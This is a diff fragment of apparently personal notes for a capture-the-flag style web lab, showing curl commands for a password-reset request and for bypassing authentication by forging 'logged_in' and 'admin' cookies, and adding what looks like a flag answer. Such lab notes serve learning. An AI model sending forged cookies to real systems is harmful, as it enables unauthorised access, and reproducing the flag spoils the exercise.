@@ -20,3 +20,5 @@ curl 'http://10.10.125.172/customers/reset?email=robert@acmeitsupport.thm' -H 'C
 #bypass authentication
 curl -H "Cookie: logged_in=true; admin=false" http://MACHINE_IP/cookie-test
 curl -H "Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-test
+
+F1x3d-iNpu7-f0rrn
